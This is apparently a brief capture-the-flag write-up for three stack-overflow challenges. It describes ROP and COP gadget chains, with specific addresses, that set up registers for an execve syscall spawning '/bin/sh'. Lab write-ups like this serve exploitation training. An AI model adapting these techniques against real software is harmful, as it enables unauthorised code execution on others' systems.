warmup : 
Use stack overflow vulnerability to change process flow to 0x40????
It start to call execve "/bin/sh".

exploitme : 
Use stack overflow vulnerability to change process flow.
To call execve, I use syscall with
    rax : 0x3B, rdi : "/bin/sh", rsi : NULL, rdx : NULL
To put this value to register, I use ROP.
Overflow stack from ret with
    0x401260 : rsi = 0
    0x4012e8 : pop rdx
    0x402004 : "/bin/sh"
    0x401270 : rax = 0
    0x401324 : rax += rdx
    0x4011e0 : rdi = rax
    0x4012d0 : rdx = 0
    0x401270 : rax = 0
    0x4012b0 : rax += 0x3b
    0x40134c : syscall

exploitme-safestack :
Use stack overflow vulnerability to change process flow.
To call execve, I use syscall with
    rax : 0x3B, rdi : "/bin/sh", rsi : NULL, rdx : NULL
To put this value to register, I use COP.
In main, It calls rcx register and loop.
So I overwrite memory with
    0x402b40 : rax = 0
    0x402b80 : rax = 0x3b
    0x402ac0 : rax = "/bin/sh"
    0x402c30 : syscall2 garget (rsi = '/bin/sh', rdi = 0x3b)
